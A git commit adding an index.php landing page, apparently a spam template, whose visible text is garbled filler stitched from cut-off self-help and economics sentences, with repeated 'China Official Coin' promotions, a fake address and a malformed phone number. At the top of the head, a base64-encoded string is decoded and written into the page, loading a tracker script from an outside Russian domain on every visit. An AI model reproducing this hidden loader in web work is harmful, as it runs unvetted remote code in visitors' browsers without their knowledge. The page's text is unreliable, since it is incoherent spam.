65c4eae4f81330834177fb85f360cd674ad70dda
qbirsutx <81927236+qbirsutx@users.noreply.github.com>
2021-04-04 21:47:44 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl90N21nZTZ5cDI5OXo5cGJwYW4iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Connect as many emotions and sensations as possible.  To do th</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="vaia0ee51mwh40rty07z">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="8qkgx3fmhpzrj3403">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Connect as many emotions and sensations as possible.  To do th</h1>
+	</section>
+
+
+	<section class="our-work" class="3x52erxkeco0ns1kyrs">
+		<h3 class="title">Despite the lawyer's protests, the bank representat</h3>
+		<p>We see the world not as it is, but as we ourselves are - or as we are determined to see it. China Official Coin: Singapore, South Korea, Malaysia.  I devote my time, ability and resources to fulfilling my Mission.  The main feature of a monopoly formation (monopoly) is the occupation of a monopoly position.  Technology.  Some of the identified markets are also heterogeneous and have their own structure.  61.  Empathic listening takes time, but it is not comparable to the enormous time it will take to correct the consequences of a misunderstanding, to redo everything again, to live with unspoken and unresolved problems, in order to reap the benefits of not providing a person with psychological oxygen.  This process in itself is a huge contribution to the Emotional Banking Account.  Perhaps the table below will help you organize your thoughts: 2. </p>
+		<hr>
+
+		<ul class="grid" class="sxy1r43ntjx4kf09zrvlu3">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="3x52erxkeco0ns1kyrs">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>However, treating money as the center of life will ultimately lead to the exact opposite result.  Interdependence opens up whole worlds</td>
+    <td>The long-term period assumes the expansion or reduction of the firm's production capacity, as well as the inflow of new firms</td>
+    <td>Must beI'm not that good.  As a result, the employee of a certain type of labor is able to use the products of any other specific type of labo</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Seek God's help and be worthy of it.  Consequently, although in a commodity value cannot exist without use-value and vice versa, while being with a par</td>
+    <td>Then we combined them, simplified and reduced their number until we got 39 specific goals with the attached criteria for their achievement.  The cur</td>
+    <td>When communicating with people who are close to you, it can be very helpful to tell them about your intentions: - I am reading a book</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Actions from Quadrant I, due to their urgency, do not require our initiative.  Then I can imagine my daughter doing somet</td>
+    <td>2a).  The way we see the problem is the problem.  Submission arises from the fear that the failure to comply with the demands of the</td>
+    <td>And the skill of interpersonal leadership is Habit 4 - Think Win / Win.  We will, without realizing it, project our own intentions onto their behavior and assume t</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="vaia0ee51mwh40rty07z">
+		<h3 class="title">The function of money as a measure of valu</h3>
+		<p>- Well! We have decided on this.  The Win / Win atmosphere has significantly increased the number of golden eggs, while feeding the goose properly, and has unleashed a tremendous potential of human energy and talent.  Depending on the method of calculating wages with piece-rate pay, there are several forms of remuneration: 1) direct piece-rate, when workers are paid for the number of units of products they have made and work performed on the basis of fixed piece-rate rates; 2) piece-rate-progressive, in which the payment rises for the output above the norm;3) piece-rate bonus, when labor remuneration includes bonuses for overfulfillment of production standards, achievement of certain quality indicators: delivery of work from the first presentation, absence of defects, complaints, saving of materials.  Sandra was ready for anything other than such a graceful no. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="8qkgx3fmhpzrj3403" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="3x52erxkeco0ns1kyrs">
+		<h3 class="title">A new joint vision began to form.  And as a result of script re</h3>
+		<p>Third, the cyclical development of the market economy leads to a reduction in the demand for labor during the depression and crisis. Chinese Coin: Sales Open In Today.  Raising taxes reduces the opportunities for producers, reduces production, which leads to a shift in the supply curve to the left.  He took it with all his heart.  Eliot, which perfectly reflect my discoveries and beliefs: “We must not stop in our search.  Identify a real-world situation in which you would like to achieve more fruitful cooperation and synergy.  And these shifts give rise to serious changes.  The onewhoever has benefited greatly from the goods and services offered by the government must pay the taxes necessary to finance the production of those goods and services.  Such goods (substitute goods) are called fungible,which can be used for the same purposes.  Do not blame, do not denounce. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="sxy1r43ntjx4kf09zrvlu3" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="sxy1r43ntjx4kf09zrvlu3" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="vaia0ee51mwh40rty07z">
+		<h3 class="title">And at the end of them we will arrive at the same p</h3>
+		<p>The goods are manufactured products,factors of production (land, labor, capital), services.  And that is the essence of Habits 1, 2, and 3.  Habits 5 and 6 have a lot to do with two parts of this process, and we'll take a deeper look at them in the next two parts of the book.  The essence of synergy is to value differences.  Loan interest is the price paid for the use of borrowed money.  Again, I quote T.S. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="8qkgx3fmhpzrj3403" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="3x52erxkeco0ns1kyrs">
+		<h3 class="title">The left hemisphere is time bound; the rig</h3>
+		<p>In the labor market, buyers offer jobs and sellers offer labor.Supply and demand in the labor market largely depend on the price of the offered product.  Exchange - the act of receiving a desired object from someone with an offer of something in return; 6) transaction.  These economic realities are influenced by many factors, and I become nervous, anxious, and aggressive towards anything that might affect them.  This leads to a reduction in the production of unprofitable goods, to the movement of labor to other industries.  We devoted half of the first day of the conference to the study and practical assimilation of Habits 4, 5 and 6.  The first is that he suffers from a loss of spontaneity and individuality, and this may turn out to be an incurable disease.  Studying the concept of elasticity allows entrepreneurs to keep abreast of changes in consumer preferences, to respond in a timely manner to the dynamically changing market environment and to react accordingly.  Turning to the others, I found that this is not what I had imagined.  But when he cuts open the goose's belly, it’s empty inside. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="sxy1r43ntjx4kf09zrvlu3" class="title">The product in serves as material for expressing the value of t</h3>	
+		<p>I can write a program, write my own script, in harmony with my values ​​and the Positions of the Personal Mission. China Official Coin: Singapore, South Korea, Malaysia.  I see many parents, mostly mothers, who are desperate in their desire to redo a lot of things, because all day it seems that they are doing nothing but meeting the needs of their young children.  The traditional, centuries-old form of government was monarchy - the divine right of kings.  He treated people like puppets who cannot have their own opinion.  People immediately ask a question that clearly reveals their core paradigm: “How do you do it? Teach me your method! " What it really means is, "Give me advice or a solution that I can use to quickly ease my own difficult situation!" And there will be teachers who will teach them what they ask for.  This approach turns failure into success.  Rewriting the script: becoming the first creator of yourself As we have already noted, proactivity is based on a unique gift of man - self-awareness.  Most of us feel we have no time for exercise. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="vaia0ee51mwh40rty07z">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="8qkgx3fmhpzrj3403"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="3x52erxkeco0ns1kyrs"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="sxy1r43ntjx4kf09zrvlu3"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>0064 Hammes Shores, Apt. 217, 81942-3536, Walshside, Kentucky, United States</p>
+		<p>Phone number: +70(378)897-95-00055</p>
+	</footer>
+
+</body>
+
+</html>
